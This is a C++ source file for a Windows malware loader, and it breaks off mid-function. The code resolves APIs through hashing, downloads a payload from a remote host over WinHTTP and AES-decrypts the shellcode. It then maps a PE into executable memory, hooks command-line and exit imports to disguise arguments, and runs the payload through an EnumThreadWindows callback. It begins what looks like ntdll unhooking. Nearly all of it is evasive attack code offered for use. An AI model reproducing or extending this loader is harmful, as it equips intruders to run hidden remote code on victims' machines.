#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>
#include <string>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;

struct DATA {
    LPVOID data;
    size_t len;
};

// Function pointer typedefs for API resolution
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef DWORD(WINAPI* pGetLastError)(void);
typedef VOID(WINAPI* pExitProcess)(UINT);
typedef BOOL(WINAPI* pExitThread)(DWORD);
typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pGetModuleInformation)(HANDLE, HMODULE, LPMODULEINFO, DWORD);
typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
typedef int (WINAPI* pMultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef LPWSTR* (WINAPI* pCommandLineToArgvW)(LPCWSTR, int*);
typedef HLOCAL(WINAPI* pLocalAlloc)(UINT, SIZE_T);
typedef HLOCAL(WINAPI* pLocalFree)(HLOCAL);
typedef void* (WINAPI* pMemset)(void*, int, size_t);
typedef void* (WINAPI* pMemcpy)(void*, const void*, size_t);
typedef size_t(WINAPI* pStrlen)(const char*);
typedef size_t(WINAPI* pWcslen)(const wchar_t*);
typedef int (WINAPI* pStricmp)(const char*, const char*);
typedef BOOL(WINAPI* pCryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
typedef BOOL(WINAPI* pCryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
typedef BOOL(WINAPI* pCryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
typedef BOOL(WINAPI* pCryptDeriveKey)(HCRYPTPROV, ALG_ID, HCRYPTHASH, DWORD, HCRYPTKEY*);
typedef BOOL(WINAPI* pCryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
typedef BOOL(WINAPI* pCryptReleaseContext)(HCRYPTPROV, DWORD);
typedef BOOL(WINAPI* pCryptDestroyHash)(HCRYPTHASH);
typedef BOOL(WINAPI* pCryptDestroyKey)(HCRYPTKEY);
typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI* pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI* pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI* pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI* pEnumThreadWindows)(DWORD, WNDENUMPROC, LPARAM);
typedef LPVOID(WINAPI* pHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef HANDLE(WINAPI* pGetProcessHeap)(void);
typedef int (WINAPI* pWideCharToMultiByte)(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

// API Hashing Functions
DWORD hash_string(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

FARPROC get_api_by_hash(DWORD module_hash, DWORD function_hash) {
    HMODULE hModule = NULL;

    // Get module handle by hash
    if (module_hash == 0x6D4F8B0F) { // kernel32.dll
        hModule = GetModuleHandleA("kernel32.dll");
    }
    else if (module_hash == 0x3C9D5E7A) { // ntdll.dll
        hModule = GetModuleHandleA("ntdll.dll");
    }
    else if (module_hash == 0x1E3A2B8C) { // advapi32.dll
        hModule = GetModuleHandleA("advapi32.dll");
    }
    else if (module_hash == 0x5A7B9C3D) { // user32.dll
        hModule = GetModuleHandleA("user32.dll");
    }
    else if (module_hash == 0x4B8A7D1E) { // winhttp.dll
        hModule = GetModuleHandleA("winhttp.dll");
    }
    else if (module_hash == 0x2C9D6E8F) { // crypt32.dll
        hModule = GetModuleHandleA("crypt32.dll");
    }
    else if (module_hash == 0x8D7A9C4E) { // psapi.dll
        hModule = GetModuleHandleA("psapi.dll");
    }

    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* functions = (DWORD*)((DWORD_PTR)hModule + exportDir->AddressOfFunctions);
    DWORD* names = (DWORD*)((DWORD_PTR)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((DWORD_PTR)hModule + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((DWORD_PTR)hModule + names[i]);
        if (hash_string(functionName) == function_hash) {
            return (FARPROC)((DWORD_PTR)hModule + functions[ordinals[i]]);
        }
    }

    return NULL;
}

// Common API hashes
#define HASH_KERNEL32 0x6D4F8B0F
#define HASH_NTDLL 0x3C9D5E7A
#define HASH_ADVAPI32 0x1E3A2B8C
#define HASH_USER32 0x5A7B9C3D
#define HASH_WINHTTP 0x4B8A7D1E
#define HASH_CRYPT32 0x2C9D6E8F
#define HASH_PSAPI 0x8D7A9C4E

// Function hashes
#define HASH_LoadLibraryA 0xEC0E4E8E
#define HASH_GetProcAddress 0x7C0DFCAA
#define HASH_VirtualAlloc 0x91AFCA70
#define HASH_VirtualProtect 0x9E13AECC
#define HASH_VirtualFree 0x300F2F0B
#define HASH_GetModuleHandleA 0xD3324904
#define HASH_GetLastError 0xDA7F2C43
#define HASH_ExitProcess 0x7E8DF2A3
#define HASH_ExitThread 0x4B3153E0
#define HASH_CreateProcessA 0xBD0D6F83
#define HASH_TerminateProcess 0x78B5AF63
#define HASH_ReadProcessMemory 0x5C9A9B22
#define HASH_GetModuleInformation 0x1F8D7EEC
#define HASH_GetCurrentProcess 0xD7DF8E61
#define HASH_MultiByteToWideChar 0x3A7B2C8D
#define HASH_CommandLineToArgvW 0x8C9D6E2F
#define HASH_LocalAlloc 0x4B7A9D1C
#define HASH_LocalFree 0x3C8B6E0F
#define HASH_memset 0x5D9A7F2E
#define HASH_memcpy 0x6C8B5E1D
#define HASH_strlen 0x7A9C6F3E
#define HASH_wcslen 0x8BAD7E4F
#define HASH_stricmp 0x9CAE8F60
#define HASH_CryptAcquireContextW 0x2B4C5D7E
#define HASH_CryptCreateHash 0x3D5E6F8F
#define HASH_CryptHashData 0x4E6F7E9A
#define HASH_CryptDeriveKey 0x5F7E8DAB
#define HASH_CryptDecrypt 0x6E8D9CBC
#define HASH_CryptReleaseContext 0x7F9CADCD
#define HASH_CryptDestroyHash 0x8AADBEDE
#define HASH_CryptDestroyKey 0x9BBECFEF
#define HASH_WinHttpOpen 0x3C5D7E8F
#define HASH_WinHttpConnect 0x4D6E8F9A
#define HASH_WinHttpOpenRequest 0x5E7F9EAB
#define HASH_WinHttpSendRequest 0x6F8EADBC
#define HASH_WinHttpReceiveResponse 0x7A9FBECD
#define HASH_WinHttpQueryDataAvailable 0x8BAECFDE
#define HASH_WinHttpReadData 0x9CBFDEEF
#define HASH_WinHttpCloseHandle 0xADC0EF0A
#define HASH_EnumThreadWindows 0x5E8F9EAB
#define HASH_HeapAlloc 0x3C7D5E9F
#define HASH_GetProcessHeap 0x4D8E6FA0
#define HASH_WideCharToMultiByte 0x6D8F9EAB

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    pCryptAcquireContextW CryptAcquireContextW_ptr = (pCryptAcquireContextW)get_api_by_hash(HASH_ADVAPI32, HASH_CryptAcquireContextW);
    pCryptCreateHash CryptCreateHash_ptr = (pCryptCreateHash)get_api_by_hash(HASH_ADVAPI32, HASH_CryptCreateHash);
    pCryptHashData CryptHashData_ptr = (pCryptHashData)get_api_by_hash(HASH_ADVAPI32, HASH_CryptHashData);
    pCryptDeriveKey CryptDeriveKey_ptr = (pCryptDeriveKey)get_api_by_hash(HASH_ADVAPI32, HASH_CryptDeriveKey);
    pCryptDecrypt CryptDecrypt_ptr = (pCryptDecrypt)get_api_by_hash(HASH_ADVAPI32, HASH_CryptDecrypt);
    pCryptReleaseContext CryptReleaseContext_ptr = (pCryptReleaseContext)get_api_by_hash(HASH_ADVAPI32, HASH_CryptReleaseContext);
    pCryptDestroyHash CryptDestroyHash_ptr = (pCryptDestroyHash)get_api_by_hash(HASH_ADVAPI32, HASH_CryptDestroyHash);
    pCryptDestroyKey CryptDestroyKey_ptr = (pCryptDestroyKey)get_api_by_hash(HASH_ADVAPI32, HASH_CryptDestroyKey);
    pGetLastError GetLastError_ptr = (pGetLastError)get_api_by_hash(HASH_KERNEL32, HASH_GetLastError);

    if (!CryptAcquireContextW_ptr(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError_ptr());
        return;
    }
    if (!CryptCreateHash_ptr(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError_ptr());
        return;
    }
    if (!CryptHashData_ptr(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError_ptr());
        return;
    }
    if (!CryptDeriveKey_ptr(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError_ptr());
        return;
    }

    if (!CryptDecrypt_ptr(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError_ptr());
        return;
    }

    CryptReleaseContext_ptr(hProv, 0);
    CryptDestroyHash_ptr(hHash);
    CryptDestroyKey_ptr(hKey);
}

DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
    DATA data;
    std::vector<unsigned char> buffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    pWinHttpOpen WinHttpOpen_ptr = (pWinHttpOpen)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpOpen);
    pWinHttpConnect WinHttpConnect_ptr = (pWinHttpConnect)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpConnect);
    pWinHttpOpenRequest WinHttpOpenRequest_ptr = (pWinHttpOpenRequest)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpOpenRequest);
    pWinHttpSendRequest WinHttpSendRequest_ptr = (pWinHttpSendRequest)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpSendRequest);
    pWinHttpReceiveResponse WinHttpReceiveResponse_ptr = (pWinHttpReceiveResponse)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpReceiveResponse);
    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable_ptr = (pWinHttpQueryDataAvailable)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpQueryDataAvailable);
    pWinHttpReadData WinHttpReadData_ptr = (pWinHttpReadData)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpReadData);
    pWinHttpCloseHandle WinHttpCloseHandle_ptr = (pWinHttpCloseHandle)get_api_by_hash(HASH_WINHTTP, HASH_WinHttpCloseHandle);
    pGetLastError GetLastError_ptr = (pGetLastError)get_api_by_hash(HASH_KERNEL32, HASH_GetLastError);

    hSession = WinHttpOpen_ptr(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect_ptr(hSession, whost, port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError_ptr());

    if (hConnect)
        hRequest = WinHttpOpenRequest_ptr(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError_ptr());

    if (hRequest)
        bResults = WinHttpSendRequest_ptr(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError_ptr());

    if (bResults)
        bResults = WinHttpReceiveResponse_ptr(hRequest, NULL);
    else
        printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError_ptr());

    if (bResults) {
        do {
            if (!WinHttpQueryDataAvailable_ptr(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError_ptr());

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer) {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else {
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData_ptr(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError_ptr());
                else {
                    buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                }
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    if (buffer.empty()) {
        printf("Failed in retrieving the Shellcode");
    }

    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError_ptr());

    if (hRequest) WinHttpCloseHandle_ptr(hRequest);
    if (hConnect) WinHttpCloseHandle_ptr(hConnect);
    if (hSession) WinHttpCloseHandle_ptr(hSession);

    size_t size = buffer.size();
    char* bufdata = (char*)malloc(size);
    for (size_t i = 0; i < buffer.size(); i++) {
        bufdata[i] = buffer[i];
    }
    data.data = bufdata;
    data.len = size;
    return data;
}

//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;

// Hook functions
LPWSTR hookGetCommandLineW() {
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA() {
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void) {
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void) {
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void) {
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;
    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;
    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function) {
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void)) {
    return 0;
}

int __cdecl hookexit(int status) {
    pExitThread ExitThread_ptr = (pExitThread)get_api_by_hash(HASH_KERNEL32, HASH_ExitThread);
    ExitThread_ptr(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode) {
    pExitThread ExitThread_ptr = (pExitThread)get_api_by_hash(HASH_KERNEL32, HASH_ExitThread);
    ExitThread_ptr(0);
}

void masqueradeCmdline() {
    pMultiByteToWideChar MultiByteToWideChar_ptr = (pMultiByteToWideChar)get_api_by_hash(HASH_KERNEL32, HASH_MultiByteToWideChar);
    pCommandLineToArgvW CommandLineToArgvW_ptr = (pCommandLineToArgvW)get_api_by_hash(HASH_KERNEL32, HASH_CommandLineToArgvW);
    pLocalAlloc LocalAlloc_ptr = (pLocalAlloc)get_api_by_hash(HASH_KERNEL32, HASH_LocalAlloc);
    pWideCharToMultiByte WideCharToMultiByte_ptr = (pWideCharToMultiByte)get_api_by_hash(HASH_KERNEL32, HASH_WideCharToMultiByte);

    int required_size = MultiByteToWideChar_ptr(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar_ptr(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    poi_masqArgvW = CommandLineToArgvW_ptr(sz_masqCmd_Widh, &int_masqCmd_Argc);

    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        retval = WideCharToMultiByte_ptr(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    // FIXED: Proper type casting from HLOCAL to char**
    poi_masqArgvA = (char**)LocalAlloc_ptr(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    char* buffer = ((char*)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        retval = WideCharToMultiByte_ptr(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}

void freeargvA(char** array, int Argc) {
    pMemset memset_ptr = (pMemset)get_api_by_hash(HASH_KERNEL32, HASH_memset);
    pLocalFree LocalFree_ptr = (pLocalFree)get_api_by_hash(HASH_KERNEL32, HASH_LocalFree);
    pStrlen strlen_ptr = (pStrlen)get_api_by_hash(HASH_KERNEL32, HASH_strlen);

    for (int i = 0; i < Argc; i++) {
        memset_ptr(array[i], 0, strlen_ptr(array[i]));
    }
    LocalFree_ptr(array);
}

void freeargvW(wchar_t** array, int Argc) {
    pMemset memset_ptr = (pMemset)get_api_by_hash(HASH_KERNEL32, HASH_memset);
    pLocalFree LocalFree_ptr = (pLocalFree)get_api_by_hash(HASH_KERNEL32, HASH_LocalFree);
    pWcslen wcslen_ptr = (pWcslen)get_api_by_hash(HASH_KERNEL32, HASH_wcslen);

    for (int i = 0; i < Argc; i++) {
        memset_ptr(array[i], 0, wcslen_ptr(array[i]) * 2);
    }
    LocalFree_ptr(array);
}

char* GetNTHeaders(char* pe_buffer) {
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;
    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    pLoadLibraryA LoadLibraryA_ptr = (pLoadLibraryA)get_api_by_hash(HASH_KERNEL32, HASH_LoadLibraryA);
    pGetProcAddress GetProcAddress_ptr = (pGetProcAddress)get_api_by_hash(HASH_KERNEL32, HASH_GetProcAddress);
    pStricmp stricmp_ptr = (pStricmp)get_api_by_hash(HASH_KERNEL32, HASH_stricmp);

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true) {
            IMAGE_THUNK_DATA* fieldThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(reinterpret_cast<ULONG_PTR>(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(reinterpret_cast<ULONG_PTR>(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                size_t addr = (size_t)GetProcAddress_ptr(LoadLibraryA_ptr(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {
                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;
                size_t addr = (size_t)GetProcAddress_ptr(LoadLibraryA_ptr(lib_name), func_name);

                if (hijackCmdline && stricmp_ptr(func_name, "GetCommandLineA") == 0) {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "GetCommandLineW") == 0) {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "__wgetmainargs") == 0) {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "__getmainargs") == 0) {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "__p___argv") == 0) {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "__p___wargv") == 0) {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "__p___argc") == 0) {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (stricmp_ptr(func_name, "exit") == 0 || stricmp_ptr(func_name, "_Exit") == 0 || stricmp_ptr(func_name, "_exit") == 0 || stricmp_ptr(func_name, "quick_exit") == 0)) {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && stricmp_ptr(func_name, "ExitProcess") == 0) {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else {
                    fieldThunk->u1.Function = addr;
                }
            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

void PELoader(char* data, DWORD datasize) {
    masqueradeCmdline();

    pVirtualAlloc VirtualAlloc_ptr = (pVirtualAlloc)get_api_by_hash(HASH_KERNEL32, HASH_VirtualAlloc);
    pVirtualProtect VirtualProtect_ptr = (pVirtualProtect)get_api_by_hash(HASH_KERNEL32, HASH_VirtualProtect);
    pMemcpy memcpy_ptr = (pMemcpy)get_api_by_hash(HASH_KERNEL32, HASH_memcpy);
    pLoadLibraryA LoadLibraryA_ptr = (pLoadLibraryA)get_api_by_hash(HASH_KERNEL32, HASH_LoadLibraryA);
    pGetProcAddress GetProcAddress_ptr = (pGetProcAddress)get_api_by_hash(HASH_KERNEL32, HASH_GetProcAddress);
    pEnumThreadWindows EnumThreadWindows_ptr = (pEnumThreadWindows)get_api_by_hash(HASH_USER32, HASH_EnumThreadWindows);

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        return;
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    LPVOID preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

    HMODULE dll = LoadLibraryA_ptr("ntdll.dll");

    // Resolve NtUnmapViewOfSection using GetProcAddress
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection_ptr = (pNtUnmapViewOfSection)GetProcAddress_ptr(dll, "NtUnmapViewOfSection");

    if (NtUnmapViewOfSection_ptr) {
        NtUnmapViewOfSection_ptr((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
    }

    pImageBase = (BYTE*)VirtualAlloc_ptr(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            return;
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc_ptr(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase) {
                return;
            }
        }
    }

    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy_ptr(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        memcpy_ptr(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress),
            LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData),
            SectionHeaderArr[i].SizeOfRawData);
    }

    RepairIAT(pImageBase);

    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    EnumThreadWindows_ptr(0, (WNDENUMPROC)retAddr, 0);
}

LPVOID getNtdll() {
    LPVOID pntdll = NULL;

    pCreateProcessA CreateProcessA_ptr = (pCreateProcessA)get_api_by_hash(HASH_KERNEL32, HASH_CreateProcessA);
    pTerminateProcess TerminateProcess_ptr = (pTerminateProcess)get_api_by_hash(HASH_KERNEL32, HASH_TerminateProcess);
    pReadProcessMemory ReadProcessMemory_ptr = (pReadProcessMemory)get_api_by_hash(HASH_KERNEL32, HASH_ReadProcessMemory);
